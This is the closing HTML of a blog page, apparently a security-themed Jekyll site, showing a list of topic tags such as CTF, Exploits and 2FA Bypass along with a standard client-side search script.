      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ctf/">CTF</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/blue-team/">Blue Team</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/bug-bounty/">Bug Bounty</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/vulnerabilities/">Vulnerabilities</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/2fa-bypass/">2FA Bypass</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/advanced-search/">Advanced Search</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/anonymity/">Anonymity</a>
      
    </div>
  </section>

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

